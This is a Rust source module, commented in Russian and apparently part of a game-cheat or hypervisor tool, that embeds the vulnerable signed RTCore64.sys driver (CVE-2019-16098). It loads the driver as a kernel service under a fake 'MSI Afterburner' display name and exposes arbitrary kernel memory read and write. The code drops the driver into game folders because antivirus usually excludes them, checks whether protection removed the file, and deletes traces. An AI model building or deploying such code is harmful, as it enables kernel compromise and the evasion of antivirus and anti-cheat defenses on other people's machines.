//! Примитив доступа к памяти ядра через подписанный RTCore64.sys 4.6.2 (CVE-2019-16098).
//! Патченые версии из новых Afterburner непригодны; служба после операций удаляется.

use std::{env, fs, path::PathBuf, thread, time::Duration};

use windows::{
    core::PCWSTR,
    Win32::{
        Foundation::{CloseHandle, GENERIC_READ, GENERIC_WRITE, HANDLE},
        Storage::FileSystem::{CreateFileW, OPEN_EXISTING},
        System::{
            IO::DeviceIoControl,
            Services::{
                CloseServiceHandle, ControlService, CreateServiceW, DeleteService, OpenSCManagerW,
                OpenServiceW, QueryServiceStatus, StartServiceW, SC_MANAGER_ALL_ACCESS,
                SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_CONTROL_STOP,
                SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL, SERVICE_RUNNING, SERVICE_STATUS,
                SERVICE_STOPPED,
            },
        },
    },
};

use crate::hvlog;

const PAYLOAD_BYTES: &[u8] = include_bytes!("../resources/RTCore64.sys");

const SERVICE_NAME: &str = "RTCore64";

/// Маскировка под установку MSI Afterburner.
const SERVICE_DISPLAY_NAME: &str = "Micro - Star MSI Afterburner";

/// IOCTL чтения 1/2/4 байт по произвольному адресу ядра.
const IOCTL_READ: u32 = 0x8000_2048;

/// IOCTL записи 1/2/4 байт по произвольному адресу ядра.
const IOCTL_WRITE: u32 = 0x8000_204C;

/// Структура обмена драйвера (0x30 байт), см. CVE-2019-16098.
#[repr(C)]
#[derive(Clone, Copy)]
struct RtcMemory {
    unknown0: [u8; 8],
    address: u64,
    unknown1: [u8; 4],
    offset: u32,
    size: u32,
    value: u32,
    unknown2: [u8; 16],
}

/// Устройство появляется не сразу после старта службы.
const DEVICE_OPEN_ATTEMPTS: usize = 20;

/// Ожидаемый размер ответа драйвера на IOCTL обмена.
const REQUEST_SIZE: u32 = 0x30;

/// Резервный каталог сессии; имя согласовано с модулем исключений защиты.
pub fn session_temp_dir() -> PathBuf {
    env::temp_dir().join(format!("Eclipse-HV-{}", std::process::id()))
}

const DRIVER_FILE_NAME: &str = "RTCore64.sys";

/// Рядом с игрой: антивирусы обычно не трогают исключённый каталог игры,
/// поэтому он основной, а временный каталог — резервный.
const GAME_STAGING_DIR: &str = ".eclipse-hv";

/// Защита реагирует на файл не мгновенно — нужна пауза до повторной проверки.
const VERIFY_DELAY_MS: u64 = 400;

const CLEANUP_ATTEMPTS: u32 = 6;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DeployAttempt {
    pub dir: PathBuf,
    pub reason: String,
    pub blocked: bool,
}

#[derive(Debug, Clone)]
pub enum DeployError {
    Blocked(Vec<DeployAttempt>),
    Io(Vec<DeployAttempt>),
}

enum ProbeFailure {
    Blocked(String),
    Io(String),
}

pub struct RtCore {
    temp_dir: PathBuf,
    driver_path: PathBuf,
    device: Option<HANDLE>,
}

impl RtCore {
    /// Разворачивает в первый доступный каталог: рядом с игрой, затем временный.
    pub fn deploy_preferred(base_dir: &std::path::Path) -> Result<Self, DeployError> {
        let mut attempts = Vec::new();

        for dir in staging_dirs(base_dir) {
            match Self::deploy_verified(&dir) {
                Ok(core) => {
                    hvlog!(Info, "ядро", "каталог драйвера выбран: {}", dir.display());
                    return Ok(core);
                }
                Err(ProbeFailure::Blocked(reason)) => {
                    hvlog!(
                        Warn,
                        "ядро",
                        "каталог {} заблокирован защитой: {reason}",
                        dir.display()
                    );
                    attempts.push(DeployAttempt {
                        dir: dir.clone(),
                        reason,
                        blocked: true,
                    });
                }
                Err(ProbeFailure::Io(reason)) => {
                    hvlog!(Warn, "ядро", "каталог {} недоступен: {reason}", dir.display());
                    attempts.push(DeployAttempt {
                        dir: dir.clone(),
                        reason,
                        blocked: false,
                    });
                }
            }

            // Следы неудачной попытки не должны оставаться на диске
            remove_staging_dir(&dir);
        }

        if attempts.iter().any(|attempt| attempt.blocked) {
            Err(DeployError::Blocked(attempts))
        } else {
            Err(DeployError::Io(attempts))
        }
    }

    #[cfg(test)]
    pub fn deploy_in(temp_dir: &std::path::Path) -> Result<Self, String> {
        Self::deploy_verified(temp_dir).map_err(|failure| match failure {
            ProbeFailure::Blocked(reason) | ProbeFailure::Io(reason) => reason,
        })
    }

    /// Записывает драйвер и проверяет, что защита не заблокировала файл.
    fn deploy_verified(temp_dir: &std::path::Path) -> Result<Self, ProbeFailure> {
        // Каталог мог остаться от прошлой сессии или неудачного запуска
        if temp_dir.exists() {
            fs::remove_dir_all(temp_dir).map_err(|err| {
                ProbeFailure::Io(format!(
                    "не удалось очистить каталог прошлой сессии: {err}"
                ))
            })?;
        }

        fs::create_dir_all(temp_dir).map_err(|err| {
            ProbeFailure::Io(format!(
                "не удалось создать каталог {}: {err}",
                temp_dir.display()
            ))
        })?;

        let driver_path = temp_dir.join(DRIVER_FILE_NAME);
        fs::write(&driver_path, PAYLOAD_BYTES).map_err(|err| {
            if is_access_denied(&err) {
                ProbeFailure::Blocked(format!("запись файла запрещена: {err}"))
            } else {
                ProbeFailure::Io(format!("не удалось записать {}: {err}", driver_path.display()))
            }
        })?;

        // Антивирус может заблокировать файл сразу после записи — ловим это до загрузки
        verify_readable(&driver_path)?;

        hvlog!(
            Info,
            "ядро",
            "драйвер развёрнут: {} ({} байт)",
            driver_path.display(),
            PAYLOAD_BYTES.len()
        );

        Ok(Self {
            temp_dir: temp_dir.to_path_buf(),
            driver_path,
            device: None,
        })
    }

    pub fn driver_path(&self) -> &PathBuf {
        &self.driver_path
    }

    /// Устанавливает и запускает службу драйвера; безопасен при повторных вызовах.
    pub fn start(&mut self) -> Result<(), String> {
        self.stop();

        install_service(&self.driver_path)?;
        hvlog!(Info, "ядро", "служба {SERVICE_NAME} установлена и запущена");

        if let Err(err) = self.open_device() {
            // Установка и удаление службы — одна транзакция
            self.stop();
            return Err(err);
        }
        Ok(())
    }

    pub fn stop(&mut self) {
        if let Some(device) = self.device.take() {
            unsafe {
                let _ = CloseHandle(device);
            }
        }
        remove_service();
    }

    pub fn read_u32(&self, address: u64) -> Result<u32, String> {
        let mut request = RtcMemory {
            unknown0: [0; 8],
            address,
            unknown1: [0; 4],
            offset: 0,
            size: 4,
            value: 0,
            unknown2: [0; 16],
        };
        self.ioctl(IOCTL_READ, &mut request)?;
        Ok(request.value)
    }

    pub fn write_u32(&self, address: u64, value: u32) -> Result<(), String> {
        let mut request = RtcMemory {
            unknown0: [0; 8],
            address,
            unknown1: [0; 4],
            offset: 0,
            size: 4,
            value,
            unknown2: [0; 16],
        };
        self.ioctl(IOCTL_WRITE, &mut request)
    }

    /// Реализовано двумя 32-битными операциями.
    pub fn read_u64(&self, address: u64) -> Result<u64, String> {
        let low = self.read_u32(address)? as u64;
        let high = self.read_u32(address + 4)? as u64;
        Ok((high << 32) | low)
    }

    /// Реализовано двумя 32-битными операциями.
    pub fn write_u64(&self, address: u64, value: u64) -> Result<(), String> {
        self.write_u32(address, value as u32)?;
        self.write_u32(address + 4, (value >> 32) as u32)
    }

    fn ioctl(&self, code: u32, request: &mut RtcMemory) -> Result<(), String> {
        let device = self
            .device
            .ok_or_else(|| "устройство драйвера не открыто".to_string())?;
        let mut returned = 0u32;
        let ok = unsafe {
            DeviceIoControl(
                device,
                code,
                Some(request as *const RtcMemory as *const core::ffi::c_void),
                std::mem::size_of::<RtcMemory>() as u32,
                Some(request as *mut RtcMemory as *mut core::ffi::c_void),
                std::mem::size_of::<RtcMemory>() as u32,
                Some(&mut returned),
                None,
            )
        };
        match ok {
            // Успех: драйвер обязан вернуть структуру обмена целиком
            Ok(()) if returned == REQUEST_SIZE => Ok(()),
            Ok(()) => Err(format!(
                "IOCTL 0x{code:08X}: драйвер вернул {returned} байт вместо {REQUEST_SIZE}"
            )),
            Err(err) => Err(format!(
                "IOCTL 0x{code:08X} отклонён драйвером: {err} (возвращено {returned} байт; возможная причина — патченая версия драйвера с белым списком адресов)"
            )),
        }
    }

    fn open_device(&mut self) -> Result<(), String> {
        for attempt in 1..=DEVICE_OPEN_ATTEMPTS {
            unsafe {
                let name = windows::core::w!("\\\\.\\RTCore64");
                let device = CreateFileW(
                    name,
                    (GENERIC_READ | GENERIC_WRITE).0,
                    windows::Win32::Storage::FileSystem::FILE_SHARE_MODE(0),
                    None,
                    OPEN_EXISTING,
                    windows::Win32::Storage::FileSystem::FILE_FLAGS_AND_ATTRIBUTES(0),
                    None,
                );
                if let Ok(handle) = device {
                    self.device = Some(handle);
                    hvlog!(Debug, "ядро", "устройство открыто (попытка {attempt})");
                    return Ok(());
                }
            }
            thread::sleep(Duration::from_millis(100));
        }
        Err("не удалось открыть устройство драйвера после старта службы".into())
    }

    pub fn cleanup(&self) {
        hvlog!(Debug, "ядро", "удаление служебного каталога: {}", self.temp_dir.display());
        remove_staging_dir(&self.temp_dir);
    }
}

impl Drop for RtCore {
    fn drop(&mut self) {
        // Страховка: служебный каталог не должен оставаться после сбоя
        if self.temp_dir.exists() {
            let _ = fs::remove_dir_all(&self.temp_dir);
        }
    }
}

fn staging_dirs(base_dir: &std::path::Path) -> Vec<PathBuf> {
    let mut dirs: Vec<PathBuf> = Vec::new();

    // Каталог игры: обычно исключён в антивирусе, поэтому файл не блокируется
    if base_dir.is_dir() {
        dirs.push(base_dir.join(GAME_STAGING_DIR));
    }

    let temp = session_temp_dir();
    if !dirs.iter().any(|dir| dir == &temp) {
        dirs.push(temp);
    }

    dirs
}

/// Проверяет, что файл драйвера можно прочитать и содержимое не изменено.
fn verify_readable(path: &std::path::Path) -> Result<(), ProbeFailure> {
    // Повторная проверка с паузой: защита реагирует на файл не мгновенно
    for attempt in 1..=2 {
        match fs::read(path) {
            Ok(bytes) if bytes.as_slice() == PAYLOAD_BYTES => {}
            Ok(_) => {
                return Err(ProbeFailure::Blocked(
                    "антивирус изменил содержимое файла".into(),
                ));
            }
            Err(err) if is_access_denied(&err) => {
                return Err(ProbeFailure::Blocked(format!(
                    "доступ к файлу запрещён: {err}"
                )));
            }
            Err(err) if err.kind() == std::io::ErrorKind::NotFound => {
                return Err(ProbeFailure::Blocked(
                    "файл удалён защитой сразу после записи".into(),
                ));
            }
            Err(err) => {
                return Err(ProbeFailure::Io(format!(
                    "не удалось прочитать файл: {err}"
                )));
            }
        }

        if attempt == 1 {
            thread::sleep(Duration::from_millis(VERIFY_DELAY_MS));
        }
    }

    Ok(())
}

fn is_access_denied(err: &std::io::Error) -> bool {
    matches!(
        err.raw_os_error(),
        // ERROR_ACCESS_DENIED, ERROR_SHARING_VIOLATION, ERROR_LOCK_VIOLATION
        Some(5) | Some(32) | Some(33)
    ) || err.kind() == std::io::ErrorKind::PermissionDenied
}

/// Удаляет служебный каталог, повторяя попытку при кратковременной блокировке.
fn remove_staging_dir(dir: &std::path::Path) {
    for _ in 0..CLEANUP_ATTEMPTS {
        if !dir.exists() {
            return;
        }
        if fs::remove_dir_all(dir).is_ok() {
            return;
        }
        thread::sleep(Duration::from_millis(150));
    }

    hvlog!(
        Warn,
        "ядро",
        "не удалось удалить служебный каталог: {}",
        dir.display()
    );
}

pub fn describe_attempts(attempts: &[DeployAttempt]) -> String {
    attempts
        .iter()
        .map(|attempt| format!("{} — {}", attempt.dir.display(), attempt.reason))
        .collect::<Vec<_>>()
        .join("; ")
}

fn install_service(driver_path: &std::path::Path) -> Result<(), String> {
    let name: Vec<u16> = SERVICE_NAME.encode_utf16().chain(Some(0)).collect();
    let display: Vec<u16> = SERVICE_DISPLAY_NAME.encode_utf16().chain(Some(0)).collect();
    let binary: Vec<u16> = driver_path
        .to_string_lossy()
        .encode_utf16()
        .chain(Some(0))
        .collect();

    unsafe {
        let manager = OpenSCManagerW(PCWSTR::null(), PCWSTR::null(), SC_MANAGER_ALL_ACCESS)
            .map_err(|err| format!("OpenSCManagerW: {err}"))?;

        let result = (|| {
            let service = CreateServiceW(
                manager,
                PCWSTR(name.as_ptr()),
                PCWSTR(display.as_ptr()),
                // Полный доступ к службе для управления и удаления
                SERVICE_ALL_ACCESS,
                SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START,
                SERVICE_ERROR_NORMAL,
                PCWSTR(binary.as_ptr()),
                None,
                None,
                None,
                None,
                None,
            )
            .map_err(|err| format!("CreateServiceW: {err}"))?;

            let started = StartServiceW(service, None);
            let start_result = if started.is_err() {
                // Служба может быть уже запущена — проверяем состояние
                let mut status = SERVICE_STATUS::default();
                if QueryServiceStatus(service, &mut status).is_ok()
                    && status.dwCurrentState == SERVICE_RUNNING
                {
                    hvlog!(Debug, "ядро", "служба уже была запущена");
                    Ok(())
                } else {
                    Err(format!("StartServiceW: {}", started.unwrap_err()))
                }
            } else {
                Ok(())
            };

            let _ = CloseServiceHandle(service);
            start_result
        })();

        let _ = CloseServiceHandle(manager);
        result
    }
}

pub fn remove_service() {
    let name: Vec<u16> = SERVICE_NAME.encode_utf16().chain(Some(0)).collect();

    unsafe {
        let Ok(manager) = OpenSCManagerW(PCWSTR::null(), PCWSTR::null(), SC_MANAGER_ALL_ACCESS)
        else {
            return;
        };

        let service = OpenServiceW(manager, PCWSTR(name.as_ptr()), SERVICE_ALL_ACCESS);
        if let Ok(service) = service {
            // Остановка службы с ожиданием перехода в состояние STOPPED
            let mut status = SERVICE_STATUS::default();
            if ControlService(service, SERVICE_CONTROL_STOP, &mut status).is_ok() {
                for _ in 0..30 {
                    let mut current = SERVICE_STATUS::default();
                    if QueryServiceStatus(service, &mut current).is_err()
                        || current.dwCurrentState == SERVICE_STOPPED
                    {
                        break;
                    }
                    thread::sleep(Duration::from_millis(100));
                }
            }
            let _ = DeleteService(service);
            let _ = CloseServiceHandle(service);
        }

        let _ = CloseServiceHandle(manager);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn каталог_игры_выбирается_первым() {
        let base = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
        let dirs = staging_dirs(&base);
        assert_eq!(dirs.first(), Some(&base.join(GAME_STAGING_DIR)));
        assert_eq!(dirs.last(), Some(&session_temp_dir()));
    }

    #[test]
    fn драйвер_разворачивается_рядом_с_игрой() {
        // Каталог внутри target/: запись гарантированно разрешена
        let base = std::env::current_dir()
            .unwrap_or_else(|_| PathBuf::from("."))
            .join("target")
            .join("eclipse-hv-tests")
            .join("staging-base");
        let _ = fs::remove_dir_all(&base);
        fs::create_dir_all(&base).expect("каталог игры создаётся");

        let core = RtCore::deploy_preferred(&base).expect("драйвер должен развернуться");
        assert_eq!(core.driver_path(), &base.join(GAME_STAGING_DIR).join(DRIVER_FILE_NAME));
        assert_eq!(fs::metadata(core.driver_path()).expect("файл на месте").len() as usize, PAYLOAD_BYTES.len());

        core.cleanup();
        assert!(!base.join(GAME_STAGING_DIR).exists());
        let _ = fs::remove_dir_all(&base);
    }

    #[test]
    fn проверка_ловит_изменённый_и_удалённый_файл() {
        // Каталог внутри target/: антивирус не блокирует служебные файлы сборки
        let dir = std::env::current_dir()
            .unwrap_or_else(|_| PathBuf::from("."))
            .join("target")
            .join("eclipse-hv-tests")
            .join("verify");
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).expect("каталог проверки создаётся");
        let path = dir.join(DRIVER_FILE_NAME);

        // Содержимое не совпадает с встроенным драйвером
        fs::write(&path, b"not a driver").expect("файл записан");
        match verify_readable(&path) {
            Err(ProbeFailure::Blocked(reason)) => assert!(reason.contains("изменил")),
            _ => panic!("изменённый файл должен считаться заблокированным"),
        }

        fs::remove_file(&path).expect("файл удалён");
        match verify_readable(&path) {
            Err(ProbeFailure::Blocked(_)) => {}
            _ => panic!("удалённый файл должен считаться заблокированным"),
        }

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn структура_обмена_имеет_документированный_размер() {
        // Размер структуры обмена драйвера фиксирован: 0x30 байт
        assert_eq!(std::mem::size_of::<RtcMemory>(), 0x30);
        // Смещения полей соответствуют разобранному протоколу драйвера
        assert_eq!(std::mem::offset_of!(RtcMemory, address), 0x08);
        assert_eq!(std::mem::offset_of!(RtcMemory, offset), 0x14);
        assert_eq!(std::mem::offset_of!(RtcMemory, size), 0x18);
        assert_eq!(std::mem::offset_of!(RtcMemory, value), 0x1C);
    }

    #[test]
    fn драйвер_разворачивается_и_совпадает_с_ресурсом() {
        // Каталог внутри target/ crate: запись гарантированно разрешена
        let temp_dir = std::env::current_dir()
            .unwrap_or_else(|_| PathBuf::from("."))
            .join("target")
            .join("eclipse-hv-tests")
            .join("rtcore");
        let _ = fs::remove_dir_all(&temp_dir);

        let core = RtCore::deploy_in(&temp_dir).expect("развёртывание должно работать");
        let metadata = fs::metadata(core.driver_path()).expect("файл драйвера должен существовать");
        assert_eq!(metadata.len() as usize, PAYLOAD_BYTES.len());
        // Устройство не открыто: операции чтения должны отклоняться
        assert!(core.read_u32(0x1000).is_err());

        core.cleanup();
        assert!(!core.driver_path().exists());
    }

    #[test]
    fn имя_службы_совпадает_с_ожидаемым() {
        assert_eq!(SERVICE_NAME, "RTCore64");
        assert_eq!(IOCTL_READ, 0x8000_2048);
        assert_eq!(IOCTL_WRITE, 0x8000_204C);
    }

    #[test]
    fn встроен_уязвимый_драйвер_ожидаемой_версии() {
        // Защита от подмены: уязвимый 4.6.2 — 14 024 байт, патченые версии крупнее
        // и отклоняют произвольные адреса IOCTL
        assert_eq!(PAYLOAD_BYTES.len(), 14_024, "размер драйвера изменился — проверьте версию");
        assert_eq!(&PAYLOAD_BYTES[0..2], b"MZ");
        // PE-заголовок: машина AMD64 (0x8664)
        let pe_offset = u32::from_le_bytes(PAYLOAD_BYTES[0x3C..0x40].try_into().unwrap()) as usize;
        let machine = u16::from_le_bytes(PAYLOAD_BYTES[pe_offset + 4..pe_offset + 6].try_into().unwrap());
        assert_eq!(machine, 0x8664);
    }
}
